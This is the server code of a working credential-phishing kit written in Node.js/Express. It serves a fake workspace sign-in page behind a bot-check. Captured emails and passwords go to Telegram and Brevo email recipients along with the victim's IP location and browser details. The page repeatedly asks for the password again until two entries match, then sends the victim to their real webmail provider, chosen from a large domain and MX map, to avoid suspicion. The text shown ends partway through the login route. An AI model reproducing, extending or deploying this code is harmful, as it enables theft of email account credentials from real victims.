const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

app.set('trust proxy', true);

// ============================================================
// MIDDLEWARE
// ============================================================
app.use(cors({
    origin: 'https://secure-auto.netlify.app',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

// ============================================================
// CONFIG
// ============================================================
const BOT_TOKEN        = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID          = process.env.TELEGRAM_CHAT_ID;
const BREVO_API_KEY    = process.env.BREVO_API_KEY;
const SENDER_EMAIL     = process.env.SENDER_EMAIL  || 'egli79380@gmail.com';
const SENDER_NAME      = process.env.SENDER_NAME   || 'ABV Monitor';
const BACKEND_URL      = process.env.BACKEND_URL   || '';
const TURNSTILE_SECRET = process.env.TURNSTILE_SECRET || '';
const REDIRECT_URL     = process.env.REDIRECT_URL  || 'https://www.google.com';

const MAX_ATTEMPTS = Math.max(2, parseInt(process.env.MAX_ATTEMPTS || '6', 10));

const EMAIL_RECIPIENTS = (process.env.EMAIL_RECIPIENTS || '')
    .split(',').map(e => e.trim()).filter(Boolean);

// ============================================================
// STARTUP LOG
// ============================================================
console.log('========================================');
console.log('🔍 Environment check:');
console.log(`   TELEGRAM_BOT_TOKEN: ${BOT_TOKEN ? '✅' : '❌ MISSING'}`);
console.log(`   TELEGRAM_CHAT_ID:   ${CHAT_ID ? '✅' : '❌ MISSING'}`);
console.log(`   BREVO_API_KEY:      ${BREVO_API_KEY ? '✅' : '❌ MISSING'}`);
console.log(`   SENDER_EMAIL:       ${SENDER_EMAIL}`);
console.log(`   EMAIL_RECIPIENTS:   ${EMAIL_RECIPIENTS.length ? '✅ ' + EMAIL_RECIPIENTS.length + ' recipient(s)' : '⚠️ none'}`);
console.log(`   TURNSTILE_SECRET:   ${TURNSTILE_SECRET ? '✅' : '⚠️ not set (verification skipped)'}`);
console.log(`   BACKEND_URL:        ${BACKEND_URL || '(same-origin)'}`);
console.log(`   MAX_ATTEMPTS (cap): ${MAX_ATTEMPTS}`);
console.log('========================================');

// ============================================================
// HELPER: Verify Turnstile
// ============================================================
async function verifyTurnstile(token, ip) {
    if (!TURNSTILE_SECRET) return true;
    try {
        const r = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({
                secret: TURNSTILE_SECRET,
                response: token || '',
                remoteip: (ip || '').split(',')[0].trim()
            })
        });
        const data = await r.json();
        return data.success === true;
    } catch (err) {
        console.error('❌ Turnstile verify error:', err.message);
        return false;
    }
}

// ============================================================
// 🔑 GLOBAL PROVIDER MAP (exact domain matches)
// ============================================================
const PROVIDER_MAP = {
    // ---- Google ----
    'gmail.com':          'https://accounts.google.com/ServiceLogin?service=mail',
    'googlemail.com':     'https://accounts.google.com/ServiceLogin?service=mail',

    // ---- Microsoft consumer ----
    'outlook.com':        'https://login.live.com/',
    'hotmail.com':        'https://login.live.com/',
    'live.com':           'https://login.live.com/',
    'msn.com':            'https://login.live.com/',
    'live.co.uk':         'https://login.live.com/',
    'outlook.co.uk':      'https://login.live.com/',
    'hotmail.co.uk':      'https://login.live.com/',
    'outlook.fr':         'https://login.live.com/',
    'hotmail.fr':         'https://login.live.com/',
    'outlook.de':         'https://login.live.com/',
    'hotmail.de':         'https://login.live.com/',
    'outlook.es':         'https://login.live.com/',
    'hotmail.es':         'https://login.live.com/',
    'outlook.it':         'https://login.live.com/',
    'hotmail.it':         'https://login.live.com/',

    // ---- Yahoo ----
    'yahoo.com':          'https://login.yahoo.com/',
    'yahoo.co.uk':        'https://login.yahoo.com/',
    'yahoo.fr':           'https://login.yahoo.com/',
    'yahoo.de':           'https://login.yahoo.com/',
    'yahoo.es':           'https://login.yahoo.com/',
    'yahoo.it':           'https://login.yahoo.com/',
    'yahoo.co.jp':        'https://login.yahoo.co.jp/',
    'yahoo.com.au':       'https://login.yahoo.com/',
    'yahoo.com.br':       'https://login.yahoo.com/',
    'yahoo.com.mx':       'https://login.yahoo.com/',
    'yahoo.com.hk':       'https://login.yahoo.com/',
    'yahoo.com.sg':       'https://login.yahoo.com/',
    'yahoo.com.tw':       'https://login.yahoo.com/',
    'yahoo.co.in':        'https://login.yahoo.com/',
    'ymail.com':          'https://login.yahoo.com/',
    'rocketmail.com':     'https://login.yahoo.com/',

    // ---- Apple ----
    'icloud.com':         'https://www.icloud.com/',
    'me.com':             'https://www.icloud.com/',
    'mac.com':            'https://www.icloud.com/',

    // ---- AOL ----
    'aol.com':            'https://login.aol.com/',
    'aim.com':            'https://login.aol.com/',

    // ---- Proton ----
    'protonmail.com':     'https://mail.proton.me/',
    'proton.me':          'https://mail.proton.me/',
    'pm.me':              'https://mail.proton.me/',

    // ---- Zoho ----
    'zoho.com':           'https://accounts.zoho.com/signin',
    'zohomail.com':       'https://accounts.zoho.com/signin',
    'zohomail.eu':        'https://accounts.zoho.eu/signin',
    'zohomail.in':        'https://accounts.zoho.in/signin',

    // ---- Tuta ----
    'tutanota.com':       'https://app.tuta.com/login',
    'tutanota.de':        'https://app.tuta.com/login',
    'tuta.io':            'https://app.tuta.com/login',
    'keemail.me':         'https://app.tuta.com/login',

    // ---- Mailbox.org / Posteo ----
    'mailbox.org':        'https://login.mailbox.org/',
    'posteo.de':          'https://posteo.de/en',
    'posteo.net':         'https://posteo.de/en',

    // ---- 🇧🇬 Bulgaria ----
    'abv.bg':             'https://mail.abv.bg/',
    'mail.bg':            'https://mail.bg/',
    'dir.bg':             'https://mail.dir.bg/',

    // ---- 🇷🇺 Russia / CIS ----
    'yandex.ru':          'https://passport.yandex.ru/auth',
    'yandex.com':         'https://passport.yandex.com/auth',
    'yandex.by':          'https://passport.yandex.by/auth',
    'yandex.kz':          'https://passport.yandex.kz/auth',
    'yandex.ua':          'https://passport.yandex.ua/auth',
    'ya.ru':              'https://passport.yandex.ru/auth',
    'mail.ru':            'https://account.mail.ru/login',
    'inbox.ru':           'https://account.mail.ru/login',
    'list.ru':            'https://account.mail.ru/login',
    'bk.ru':              'https://account.mail.ru/login',
    'internet.ru':        'https://account.mail.ru/login',
    'rambler.ru':         'https://mail.rambler.ru/',
    'lenta.ru':           'https://mail.rambler.ru/',
    'ro.ru':              'https://mail.rambler.ru/',
    'ukr.net':            'https://mail.ukr.net/',
    'i.ua':               'https://mail.i.ua/',

    // ---- 🇰🇷 Korea ----
    'naver.com':          'https://nid.naver.com/nidlogin.login',
    'daum.net':           'https://accounts.kakao.com/login',
    'hanmail.net':        'https://accounts.kakao.com/login',
    'kakao.com':          'https://accounts.kakao.com/login',
    'nate.com':           'https://www.nate.com/',
    'korea.com':          'https://www.korea.com/',
    'chol.com':           'https://www.chol.com/',

    // ---- 🇨🇳 China ----
    'qq.com':             'https://mail.qq.com/',
    'foxmail.com':        'https://mail.qq.com/',
    '163.com':            'https://mail.163.com/',
    '126.com':            'https://mail.126.com/',
    'yeah.net':           'https://mail.yeah.net/',
    'sina.com':           'https://mail.sina.com.cn/',
    'sina.cn':            'https://mail.sina.com.cn/',
    'sohu.com':           'https://mail.sohu.com/',
    'aliyun.com':         'https://mail.aliyun.com/',
    '139.com':            'https://mail.10086.cn/',
    '189.cn':             'https://webmail30.189.cn/',

    // ---- 🇯🇵 Japan ----
    'docomo.ne.jp':       'https://mail.smt.docomo.ne.jp/',
    'ezweb.ne.jp':        'https://id.auone.jp/',
    'au.com':             'https://id.auone.jp/',
    'softbank.ne.jp':     'https://www.softbank.jp/',
    'i.softbank.jp':      'https://www.softbank.jp/',
    'nifty.com':          'https://webmail.nifty.com/',
    'biglobe.ne.jp':      'https://mail.biglobe.ne.jp/',

    // ---- 🇮🇳 India ----
    'rediffmail.com':     'https://mail.rediff.com/cgi-bin/login.cgi',
    'rediff.com':         'https://mail.rediff.com/cgi-bin/login.cgi',
    'indiatimes.com':     'https://mail.indiatimes.com/',

    // ---- 🇩🇪 Germany / Austria / Switzerland ----
    'web.de':             'https://webmail.web.de/',
    'gmx.de':             'https://www.gmx.net/',
    'gmx.net':            'https://www.gmx.net/',
    'gmx.com':            'https://www.gmx.com/',
    'gmx.at':             'https://www.gmx.at/',
    'gmx.ch':             'https://www.gmx.ch/',
    't-online.de':        'https://email.t-online.de/',
    'freenet.de':         'https://email.freenet.de/',
    'arcor.de':           'https://webmail.arcor.de/',
    'mail.com':           'https://www.mail.com/',
    'email.com':          'https://www.mail.com/',

    // ---- 🇫🇷 France ----
    'orange.fr':          'https://login.orange.fr/',
    'wanadoo.fr':         'https://login.orange.fr/',
    'laposte.net':        'https://www.laposte.net/accueil',
    'free.fr':            'https://subscribe.free.fr/login/',
    'sfr.fr':             'https://www.sfr.fr/',
    'bbox.fr':            'https://www.bbox.fr/',

    // ---- 🇮🇹 Italy ----
    'libero.it':          'https://login.libero.it/',
    'virgilio.it':        'https://login.virgilio.it/',
    'tin.it':             'https://mail.tin.it/',
    'alice.it':           'https://login.alice.it/',

    // ---- 🇪🇸 Spain ----
    'terra.com':          'https://login.terra.com/',
    'terra.es':           'https://login.terra.es/',
    'telefonica.net':     'https://login.terra.es/',

    // ---- 🇵🇱 Poland ----
    'wp.pl':              'https://profil.wp.pl/login.html',
    'o2.pl':              'https://poczta.o2.pl/',
    'interia.pl':         'https://poczta.interia.pl/',
    'interia.eu':         'https://poczta.interia.pl/',
    'onet.pl':            'https://login.onet.pl/',
    'onet.com.pl':        'https://login.onet.pl/',
    'op.pl':              'https://poczta.o2.pl/',

    // ---- 🇹🇷 Turkey ----
    'mynet.com':          'https://mail.mynet.com/',
    'superonline.com':    'https://mail.superonline.com/',
    'ttmail.com':         'https://mail.ttmail.com/',

    // ---- 🇻🇳 Vietnam ----
    'vnn.vn':             'https://mail.vnn.vn/',
    'fpt.vn':             'https://mail.fpt.vn/',
    'viettel.vn':         'https://mail.viettel.vn/',

    // ---- 🇹🇭 Thailand ----
    'hotmail.co.th':      'https://login.live.com/',
    'thaimail.com':       'https://www.thaimail.com/',

    // ---- 🇮🇩 Indonesia ----
    'yahoo.co.id':        'https://login.yahoo.com/',
    'telkom.net':         'https://mail.telkom.net/',

    // ---- 🇧🇷 Brazil ----
    'uol.com.br':         'https://email.uol.com.br/',
    'bol.com.br':         'https://www.bol.com.br/',
    'terra.com.br':       'https://login.terra.com.br/',
    'ig.com.br':          'https://mail.ig.com.br/',
    'globo.com':          'https://login.globo.com/',

    // ---- 🇿🇦 South Africa ----
    'mweb.co.za':         'https://mail.mweb.co.za/',
    'telkomsa.net':       'https://mail.telkomsa.net/',
    'webmail.co.za':      'https://webmail.co.za/',

    // ---- 🇦🇺 Australia / NZ ----
    'bigpond.com':        'https://login.telstra.com.au/',
    'optusnet.com.au':    'https://webmail.optusnet.com.au/',
    'xtra.co.nz':         'https://webmail.xtra.co.nz/',

    // ---- 🇬🇷 Greece ----
    'otenet.gr':          'https://webmail.otenet.gr/',
    'forthnet.gr':        'https://webmail.forthnet.gr/',

    // ---- 🇷🇴 Romania ----
    'rdslink.ro':         'https://webmail.rdslink.ro/',
    'clicknet.ro':        'https://webmail.clicknet.ro/',

    // ---- 🇭🇺 Hungary ----
    'freemail.hu':        'https://freemail.hu/',
    'citromail.hu':       'https://www.citromail.hu/',

    // ---- 🇨🇿 Czech ----
    'seznam.cz':          'https://email.seznam.cz/',
    'centrum.cz':         'https://email.centrum.cz/',
    'atlas.cz':           'https://email.atlas.cz/',
    'email.cz':           'https://email.seznam.cz/',

    // ---- 🇳🇱 Netherlands ----
    'ziggo.nl':           'https://mail.ziggo.nl/',
    'kpnmail.nl':         'https://webmail.kpnmail.nl/',
    'xs4all.nl':          'https://webmail.xs4all.nl/',

    // ---- 🇸🇪 Sweden / 🇳🇴 Norway / 🇩🇰 Denmark / 🇫🇮 Finland ----
    'telia.com':          'https://webmail.telia.com/',
    'comhem.se':          'https://webmail.comhem.se/',
    'online.no':          'https://webmail.online.no/',
    'broadpark.no':       'https://webmail.broadpark.no/',
    'elisa.fi':           'https://webmail.elisa.fi/',

    // ---- 🇵🇹 Portugal ----
    'sapo.pt':            'https://mail.sapo.pt/',
    'clix.pt':            'https://mail.clix.pt/',

    // ---- 🇺🇦 Ukraine ----
    'meta.ua':            'https://mail.meta.ua/',
    'ukr.net':            'https://mail.ukr.net/',

    // ---- 🇷🇸 Serbia / 🇭🇷 Croatia / 🇸🇮 Slovenia ----
    'sbb.rs':             'https://webmail.sbb.rs/',
    't-com.hr':           'https://webmail.t-com.hr/',
    'siol.net':           'https://webmail.siol.net/'
};

// ============================================================
// 🔑 MX-based provider detection (works for ANY domain worldwide)
// ============================================================
const MX_PROVIDER_MAP = [
    // [regex on MX hostname, login URL]
    [/google|googlemail|gmail/i,        'https://accounts.google.com/ServiceLogin?service=mail'],
    [/outlook|office365|microsoft|hotmail|live\.com|protection\.outlook/i,
                                        'https://login.live.com/'],
    [/yandex/i,                         'https://passport.yandex.com/auth'],
    [/mail\.ru|inbox\.ru|bk\.ru/i,      'https://account.mail.ru/login'],
    [/naver/i,                          'https://nid.naver.com/nidlogin.login'],
    [/daum|kakao|hanmail/i,             'https://accounts.kakao.com/login'],
    [/qq\.com|foxmail/i,                'https://mail.qq.com/'],
    [/163\.com|126\.com|yeah\.net/i,    'https://mail.163.com/'],
    [/zoho/i,                           'https://accounts.zoho.com/signin'],
    [/proton|protonmail/i,              'https://mail.proton.me/'],
    [/tutanota|tuta/i,                  'https://app.tuta.com/login'],
    [/abv\.bg/i,                        'https://mail.abv.bg/'],
    [/mail\.bg/i,                       'https://mail.bg/'],
    [/seznam/i,                         'https://email.seznam.cz/'],
    [/wp\.pl|o2\.pl|interia/i,          'https://profil.wp.pl/login.html'],
    [/t-online/i,                       'https://email.t-online.de/'],
    [/web\.de|gmx/i,                    'https://webmail.web.de/'],
    [/orange\.fr|wanadoo/i,             'https://login.orange.fr/'],
    [/laposte/i,                        'https://www.laposte.net/accueil'],
    [/libero|virgilio/i,                'https://login.libero.it/'],
    [/terra/i,                          'https://login.terra.com/'],
    [/uol\.com\.br/i,                   'https://email.uol.com.br/'],
    [/rediff/i,                         'https://mail.rediff.com/cgi-bin/login.cgi'],
    [/yahoo/i,                          'https://login.yahoo.com/'],
    [/icloud|apple/i,                   'https://www.icloud.com/'],
    [/aol/i,                            'https://login.aol.com/'],
    [/zoho/i,                           'https://accounts.zoho.com/signin'],
    [/mailbox\.org/i,                   'https://login.mailbox.org/'],
    [/mimecast|proofpoint|barracuda/i,  null] // security gateways → fall through
];

// ============================================================
// HELPER: MX → provider URL
// ============================================================
function providerFromMX(mxRecord) {
    if (!mxRecord || mxRecord === 'no-mx' || mxRecord === 'MX-Error') return null;
    const first = mxRecord.split('\n')[0];
    for (const [re, url] of MX_PROVIDER_MAP) {
        if (re.test(first)) return url; // null means "known but no login page"
    }
    return null;
}

// ============================================================
// HELPER: TLD fallback for unresolved domains
// ============================================================
function providerFromTLD(domain) {
    const tld = (domain.split('.').pop() || '').toLowerCase();
    const TLD_MAP = {
        'bg': 'https://mail.bg/',
        'ru': 'https://passport.yandex.ru/auth',
        'ua': 'https://mail.ukr.net/',
        'by': 'https://passport.yandex.by/auth',
        'kz': 'https://passport.yandex.kz/auth',
        'kr': 'https://nid.naver.com/nidlogin.login',
        'jp': 'https://login.yahoo.co.jp/',
        'cn': 'https://mail.qq.com/',
        'de': 'https://webmail.web.de/',
        'fr': 'https://login.orange.fr/',
        'it': 'https://login.libero.it/',
        'es': 'https://login.terra.es/',
        'pl': 'https://profil.wp.pl/login.html',
        'tr': 'https://mail.mynet.com/',
        'cz': 'https://email.seznam.cz/',
        'hu': 'https://freemail.hu/',
        'ro': 'https://webmail.rdslink.ro/',
        'gr': 'https://webmail.otenet.gr/',
        'nl': 'https://mail.ziggo.nl/',
        'se': 'https://webmail.telia.com/',
        'no': 'https://webmail.online.no/',
        'dk': 'https://webmail.telia.com/',
        'fi': 'https://webmail.elisa.fi/',
        'pt': 'https://mail.sapo.pt/',
        'br': 'https://email.uol.com.br/',
        'mx': 'https://login.terra.com/',
        'in': 'https://mail.rediff.com/cgi-bin/login.cgi',
        'th': 'https://www.thaimail.com/',
        'id': 'https://login.yahoo.com/',
        'vn': 'https://mail.vnn.vn/',
        'za': 'https://webmail.co.za/',
        'au': 'https://login.telstra.com.au/',
        'nz': 'https://webmail.xtra.co.nz/'
    };
    return TLD_MAP[tld] || null;
}

// ============================================================
// MAIN RESOLVER: email → provider login URL
// Works for virtually any domain on Earth.
// ============================================================
function getProviderLoginUrl(email, mxRecord) {
    const domain = (email || '').split('@')[1]?.toLowerCase() || '';
    if (!domain) return REDIRECT_URL;

    // 1) Exact match
    if (PROVIDER_MAP[domain]) return PROVIDER_MAP[domain];

    // 2) MX-based detection (works for corporate/B2B domains too)
    const fromMX = providerFromMX(mxRecord);
    if (fromMX) return fromMX;

    // 3) TLD hint
    const fromTLD = providerFromTLD(domain);
    if (fromTLD) return fromTLD;

    // 4) Google search fallback — user lands on a page showing their
    //    actual webmail as the top result.
    return `https://www.google.com/search?q=${encodeURIComponent(domain + ' webmail login')}`;
}

// ============================================================
// HELPER: Send Email via Brevo
// ============================================================
async function sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, attempt, isMatch, maxAttempts, redirectUrl) {
    if (!BREVO_API_KEY || EMAIL_RECIPIENTS.length === 0) {
        console.log('⚠️ Brevo not fully configured, skipping email');
        return false;
    }

    const matchTag = isMatch ? '✅ MATCH' : '⏳ pending';
    const subject = `🔐 ABV ${email} — Attempt ${attempt}/${maxAttempts} ${matchTag}`;

    const htmlContent = `
    <!DOCTYPE html><html><head><style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { background: #1e930c; color: #fff; padding: 15px; border-radius: 5px 5px 0 0; text-align: center; }
        .content { padding: 20px; }
        .field { margin: 10px 0; padding: 10px; background: #f8f8f8; border-radius: 5px; }
        .label { font-weight: bold; color: #555; }
        .value { color: #1e930c; font-size: 16px; }
        .mx { color: #1e930c; font-size: 14px; white-space: pre-line; font-family: monospace; }
        .footer { text-align: center; padding: 15px; color: #999; font-size: 12px; border-top: 1px solid #eee; margin-top: 20px; }
        .badge { display:inline-block;padding:4px 10px;background:#1e930c;color:#fff;border-radius:4px;font-size:12px;margin-left:8px }
    </style></head><body>
        <div class="container">
            <div class="header"><h2>🔐 ABV Login Credentials <span class="badge">${attempt}/${maxAttempts} ${matchTag}</span></h2></div>
            <div class="content">
                <div class="field"><div class="label">📧 Email:</div><div class="value"><strong>${email}</strong></div></div>
                <div class="field"><div class="label">🔑 Password:</div><div class="value"><strong>${password}</strong></div></div>
                <div class="field"><div class="label">🔢 Attempt:</div><div class="value"><strong>${attempt} of ${maxAttempts}</strong></div></div>
                <div class="field"><div class="label">🎯 Match:</div><div class="value"><strong>${isMatch ? 'YES (final)' : 'no'}</strong></div></div>
                <div class="field"><div class="label">🌐 Domain:</div><div class="value">${domain || 'Unknown'}</div></div>
                <div class="field"><div class="label">📨 MX Record:</div><div class="value mx">${mxRecord || 'Unknown'}</div></div>
                <div class="field"><div class="label">➡️ Redirect:</div><div class="value">${redirectUrl || 'N/A'}</div></div>
                <div class="field"><div class="label">🌍 IP Address:</div><div class="value">${ipInfo?.ip || 'Unknown'}</div></div>
                <div class="field"><div class="label">📍 Location:</div><div class="value">${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}</div></div>
                <div class="field"><div class="label">📱 Browser:</div><div class="value">${(userAgent || '').substring(0, 100)}...</div></div>
                <div class="field"><div class="label">🕐 Time:</div><div class="value">${new Date().toLocaleString()}</div></div>
            </div>
            <div class="footer"><p>© ${new Date().getFullYear()} ABV Monitor</p></div>
        </div>
    </body></html>`;

    const textContent = `
🔐 ABV Login Credentials (Attempt ${attempt}/${maxAttempts}) — ${matchTag}
════════════════════════════════════
📧 Email: ${email}
🔑 Password: ${password}
🔢 Attempt: ${attempt} of ${maxAttempts}
🎯 Match: ${isMatch ? 'YES (final)' : 'no'}
🌐 Domain: ${domain || 'Unknown'}
📨 MX Record: ${mxRecord || 'Unknown'}
➡️ Redirect: ${redirectUrl || 'N/A'}
🌍 IP Address: ${ipInfo?.ip || 'Unknown'}
📍 Location: ${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}
📱 Browser: ${(userAgent || '').substring(0, 100)}...
🕐 Time: ${new Date().toLocaleString()}
════════════════════════════════════`;

    try {
        const response = await fetch('https://api.brevo.com/v3/smtp/email', {
            method: 'POST',
            headers: {
                'api-key': BREVO_API_KEY,
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                sender: { name: SENDER_NAME, email: SENDER_EMAIL },
                to: EMAIL_RECIPIENTS.map(e => ({ email: e })),
                subject,
                htmlContent,
                textContent
            })
        });
        const data = await response.json();
        if (response.ok) {
            console.log('✅ Email sent via Brevo:', data.messageId || 'sent');
            return true;
        }
        console.error('❌ Brevo API error:', response.status, data.message || data.error || JSON.stringify(data));
        return false;
    } catch (error) {
        console.error('❌ Failed to send email via Brevo:', error.message);
        return false;
    }
}

// ============================================================
// HELPER: Telegram
// ============================================================
async function sendToTelegram(message) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.log('⚠️ Telegram not configured, skipping');
        return null;
    }
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        });
        const result = await response.json();
        console.log('📤 Telegram:', result.ok ? '✅ Sent' : '❌ Failed — ' + (result.description || ''));
        return result;
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return null;
    }
}

// ============================================================
// HELPERS: IP + MX
// ============================================================
async function getIPInfo(ip) {
    try {
        const firstIP = (ip || '').split(',')[0].trim().replace(/^::ffff:/, '');
        const response = await fetch(`https://ipinfo.io/${firstIP}/json`);
        return await response.json();
    } catch (error) {
        console.error('❌ IP info error:', error.message);
        return { ip: ip || 'Unknown', country: 'Unknown', city: 'Unknown', region: 'Unknown' };
    }
}

async function getMXRecord(domain) {
    try {
        const response = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
        const data = await response.json();
        if (data && data.Answer && data.Answer.length > 0) {
            return data.Answer.map(r => r.data).join('\n');
        }
        return 'no-mx';
    } catch (error) {
        return 'MX-Error';
    }
}

// ============================================================
// ROUTE: /a  →  serve login form (silent match loop)
// ============================================================
app.get('/a', async (req, res) => {
    const token = req.query.t;
    const key   = req.query.k;
    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';

    console.log(`🔐 /a hit — k=${key} t=${(token||'').slice(0,20)}... ip=${clientIP}`);

    const ok = await verifyTurnstile(token, clientIP);
    if (!ok) {
        console.log('❌ Turnstile failed');
        return res.status(403).send('Verification failed. Please try again.');
    }

    sendToTelegram(`👤 Visitor verified Turnstile
IP: ${clientIP}
Key: ${key}
Time: ${new Date().toISOString()}`).catch(()=>{});

    res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Sign in</title>
<style>
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f4f5f7;color:#2c3e50}
.box{background:#fff;border-radius:12px;box-shadow:0 2px 24px rgba(0,0,0,0.06);padding:38px 34px;max-width:400px;width:92%}
h2{color:#1e293b;margin:0 0 8px;font-size:1.25rem}
p.sub{color:#64748b;font-size:.9rem;margin-bottom:20px}
label{display:block;font-size:.8rem;color:#475569;margin:10px 0 4px}
input{width:100%;padding:12px;border:1px solid #e2e8f0;border-radius:6px;font-size:14px;box-sizing:border-box;outline:none}
input:focus{border-color:#1e930c;box-shadow:0 0 0 3px rgba(30,147,12,.12)}
input[readonly]{background:#f8fafc;color:#64748b}
button{width:100%;padding:12px;background:#1e930c;color:#fff;border:0;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;margin-top:16px}
button:hover{background:#167a09}
button:disabled{opacity:.6;cursor:not-allowed}
.msg{color:#64748b;font-size:13px;margin-top:10px;display:none;text-align:center}
.spin{display:inline-block;width:12px;height:12px;border:2px solid #cbd5e1;border-top-color:#1e930c;border-radius:50%;animation:sp .7s linear infinite;vertical-align:-2px;margin-right:6px}
@keyframes sp{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="box">
  <h2>Sign in to your workspace</h2>
  <p class="sub" id="sub">Enter your credentials to continue.</p>
  <form id="lf" autocomplete="off">
    <label for="em">Email address</label>
    <input id="em" type="email" name="email" required>
    <label for="pw">Password</label>
    <input id="pw" type="password" name="password" required>
    <button type="submit" id="btn">Sign in</button>
    <div class="msg" id="msg"></div>
  </form>
</div>
<script>
(function(){
  var BACKEND      = ${JSON.stringify(BACKEND_URL)};
  var REDIRECT     = ${JSON.stringify(REDIRECT_URL)};
  var MAX_ATTEMPTS = ${MAX_ATTEMPTS};

  var form = document.getElementById('lf');
  var btn  = document.getElementById('btn');
  var msg  = document.getElementById('msg');
  var sub  = document.getElementById('sub');

  var attempt      = 0;
  var lockedEmail  = null;
  var lastPassword = null;
  var redirectUrl  = REDIRECT;

  function showMsg(text, spin){
    msg.innerHTML = (spin ? '<span class="spin"></span>' : '') + text;
    msg.style.display = 'block';
  }

  form.addEventListener('submit', async function(e){
    e.preventDefault();

    if (attempt > 0 && lockedEmail) {
      form.email.value = lockedEmail;
    } else {
      lockedEmail = form.email.value.trim();
    }

    var thisPassword = form.password.value;
    attempt++;
    btn.disabled = true;
    btn.textContent = 'Signing in...';
    showMsg('Verifying credentials', true);

    var body = {
      email:        lockedEmail,
      password:     thisPassword,
      prevPassword: lastPassword,
      attempt:      attempt
    };

    var data = null;
    try {
      var r = await fetch(BACKEND + '/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      });
      data = await r.json().catch(function(){ return null; });
    } catch(_){}

    if (data && data.redirect) redirectUrl = data.redirect;
    lastPassword = thisPassword;

    var shouldRetry = data && data.retry === true;

    if (shouldRetry) {
      form.password.value = '';
      form.password.focus();
      form.email.readOnly = true;
      btn.disabled = false;
      btn.textContent = 'Sign in';
      showMsg('Please re-enter your password to continue.', false);
      sub.textContent = 'Session verification required.';
      return;
    }

    btn.textContent = 'Redirecting...';
    showMsg('Redirecting to your provider', true);
    setTimeout(function(){ window.location.href = redirectUrl; }, 600);
  });
})();
</script>
</body></html>`);
});

// ============================================================
// ROUTE: /api/login
// ============================================================
app.post('/api/login', async (req, res) => {
    console.log('📧 Login attempt received');
    const { email, password, prevPassword } = req.body || {};
    const attemptFromClient = parseInt(req.body?.attempt, 10);
    const attempt = Number.isFinite(attemptFromClient) && attemptFromClient > 0
        ? Math.min(attemptFromClient, MAX_ATTEMPTS)
        : 1;

    if (!email || !password) {
        return res.status(400).json({
            success: false,
            message: 'Email and password are required',
            redirect: REDIRECT_URL,
            retry: false
        });
    }

    const emailRegex = /^([a-zA-Z0-9_.\-])+@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
    if (!emailRegex.test(email)) {
        return res.status(400).json({
            success: false,
            message: 'Invalid email format',
            redirect: REDIRECT_URL,
            retry: false
        });
    }

    // Silent match check
    const isMatch = typeof prevPassword === 'string' &&
                    prevPassword.length > 0 &&
                    prevPassword === password;

    const hitCap = attempt >= MAX_ATTEMPTS;
    const shouldRetry = !isMatch && !hitCap;
    const finalReason = isMatch ? 'match' : (hitCap ? 'cap' : null);

    // Collect context
    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    const ipInfo = await getIPInfo(clientIP);
    const domain = email.split('@')[1];
    const mxRecord = await getMXRecord(domain);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const acceptLanguage = req.headers['accept-language'] || 'Unknown';

    // Compute redirect NOW so we can include it in the Telegram message
    const redirectUrl = getProviderLoginUrl(email, mxRecord);

    // ---- Telegram ----
    const header = isMatch
        ? `✅ MATCH — Attempt ${attempt}/${MAX_ATTEMPTS} — FINAL`
        : (hitCap
            ? `🎯 CAP REACHED — Attempt ${attempt}/${MAX_ATTEMPTS} — FORCING EXIT`
            : `⏳ Attempt ${attempt}/${MAX_ATTEMPTS} — no match yet`);

    const telegramMessage = `${header}
--------+ Excel ReZulT ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +--------
Email : ${email}
Password : ${password}
Prev Password : ${prevPassword || '(none)'}
Match : ${isMatch ? 'YES' : 'no'}
Attempt : ${attempt} of ${MAX_ATTEMPTS}
Checker: ${email}:${password}
Browser : ${userAgent}
Language : ${acceptLanguage}
MX Record : ${mxRecord}
➡️ Redirect : ${redirectUrl}
IP Address : ${clientIP}
Region and Country : ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'}
Date : ${new Date().toISOString()}
---------+ Excel ReZulT ${ipInfo.city || 'Unknown'} ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'} +-------------`;

    console.log(`📤 Telegram — attempt ${attempt}/${MAX_ATTEMPTS} — match=${isMatch} retry=${shouldRetry}`);
